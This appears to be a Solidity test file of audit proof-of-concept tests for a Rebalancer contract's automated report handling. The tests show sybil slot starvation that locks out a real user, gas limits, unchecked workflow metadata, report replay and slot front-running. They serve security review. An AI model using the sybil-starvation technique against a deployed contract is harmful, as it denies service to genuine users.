// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {RebalancerTestBase} from "repo/test/Rebalancer.t.sol";
import {Rebalancer} from "repo/src/Rebalancer.sol";

contract CrePoC is RebalancerTestBase {
    function _meta(bytes32 wfId, address wfOwner) internal pure returns (bytes memory) {
        // 64 bytes, zoals KeystoneForwarder rawReport[45:109] aanlevert
        return abi.encodePacked(wfId, bytes10("whatever"), wfOwner, bytes2(0x0001));
    }

    /// PoC-1: slot-starvation. 6 owners, "sybil" 1-5 registreren eerst met dust-params (band 1 bps, cap 1 bps,
    /// minTrade 1, interval 1 uur). De workflow neemt dueOwners(0,50)[:5]; owner 6 komt nooit aan de beurt.
    function test_poc_starvationByRegistrationOrder() public {
        Rebalancer.Params memory dust = Rebalancer.Params({
            active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100
        });
        address[5] memory sybil;
        for (uint256 i = 0; i < 5; i++) {
            sybil[i] = makeAddr(string(abi.encodePacked("sybil", i)));
            _setUser(sybil[i], 1000e6, 0, dust); // 100% EURC, target 80%: drift 80% >> band, trade = 1 bps van 1000 = 0,1 EURC
        }
        _setUser(alice, 1000e6, 0, _defaultParams()); // echte gebruiker, registreert als zesde

        _hour(START + 1, sybil);
        _hour(START + 1 hours + 1, sybil);
        _hour(START + 2 hours + 1, sybil);
        // Kosten voor de aanvaller: 5 x 0,1 EURC per uur verplaatst tegen 25 bps fee = 0,00125 EURC/uur.
        emit log_named_uint("treasury-fee na 15 dust-runs (EURC-basiseenheden)", eurc.balanceOf(treasury));
        assertLt(eurc.balanceOf(treasury), 5_000, "fee dekt de CRE-gaskosten niet");
    }

    function _hour(uint256 ts, address[5] memory sybil) internal {
        vm.warp(ts);
        _setPrice(PRICE); // feeds vers houden (heartbeat), zoals op mainnet
        address[] memory due = r.dueOwners(0, 50);
        emit log_named_uint("ts", ts);
        emit log_named_uint("  due.length", due.length);
        assertEq(due.length, 6, "alle zes zijn due");
        address[] memory report = new address[](5);
        for (uint256 i = 0; i < 5; i++) report[i] = due[i];
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(report));
        for (uint256 i = 0; i < 5; i++) assertEq(uint256(r.lastExecutedAt(sybil[i])), ts, "sybil bediend");
        assertEq(r.lastExecutedAt(alice), 0, "alice wordt nooit bediend via CRE");
    }

    /// PoC-2: 5 owners die elk (bijna) het volledige EXECUTE_GAS verbruiken passen in ~3,7M gas.
    function test_poc_fiveFullBudgetOwnersFit() public {
        uint256[6] memory burns = [uint256(0), 100_000, 150_000, 200_000, 225_000, 250_000];
        for (uint256 b = 0; b < burns.length; b++) {
            uint256 snap = vm.snapshotState();
            router.setGasBurn(burns[b]);
            address[] memory list = new address[](5);
            for (uint256 i = 0; i < 5; i++) {
                list[i] = makeAddr(string(abi.encodePacked("g", i)));
                _setUser(list[i], 1000e6, 0, _defaultParams());
            }
            uint256 g0 = gasleft();
            vm.prank(forwarder);
            r.onReport{gas: 3_700_000}(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(list));
            uint256 used = g0 - gasleft();
            uint256 executed;
            for (uint256 i = 0; i < 5; i++) if (r.lastExecutedAt(list[i]) != 0) executed++;
            emit log_named_uint("burn", burns[b]);
            emit log_named_uint("  executed of 5 (3.7M gas)", executed);
            emit log_named_uint("  onReport gas used", used);
            vm.revertToState(snap);
        }
    }

    /// PoC-3: metadata korter dan 62 bytes laat de hele call reverten (geen try/catch daar); 64 bytes van de
    /// forwarder wordt gewoon geaccepteerd; workflowId en -naam worden niet gecontroleerd.
    function test_poc_metadataHandling() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        address[] memory list = new address[](1);
        list[0] = alice;
        vm.prank(forwarder);
        vm.expectRevert();
        r.onReport(hex"00", abi.encode(list));
        vm.prank(forwarder);
        r.onReport(_meta(keccak256("andere-workflow-zelfde-owner"), workflowOwner), abi.encode(list));
        assertEq(r.lastExecutedAt(alice), uint64(START));
    }

    /// PoC-4: replay van hetzelfde rapport is op contractniveau onschadelijk (NotDue).
    function test_poc_replayIsIdempotent() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        address[] memory list = new address[](1);
        list[0] = alice;
        bytes memory report = abi.encode(list);
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), report);
        uint256 bal = eurc.balanceOf(alice);
        vm.expectEmit(true, false, false, true, address(r));
        emit Rebalancer.ReportSkipped(alice, abi.encodeWithSelector(Rebalancer.NotDue.selector));
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), report);
        assertEq(eurc.balanceOf(alice), bal);
    }

    /// PoC-5: een owner die vlak voor het rapport zelf execute aanroept (of via een derde) steelt het slot;
    /// het rapport slaat hem over met NotDue. Onschadelijk voor fondsen, wel verspilling van een van de 5 slots.
    function test_poc_frontrunSlot() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        r.execute(alice, bob);
        address[] memory list = new address[](1);
        list[0] = alice;
        vm.expectEmit(true, false, false, true, address(r));
        emit Rebalancer.ReportSkipped(alice, abi.encodeWithSelector(Rebalancer.NotDue.selector));
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(list));
        assertEq(eurc.balanceOf(bob), 50_000);
    }
}
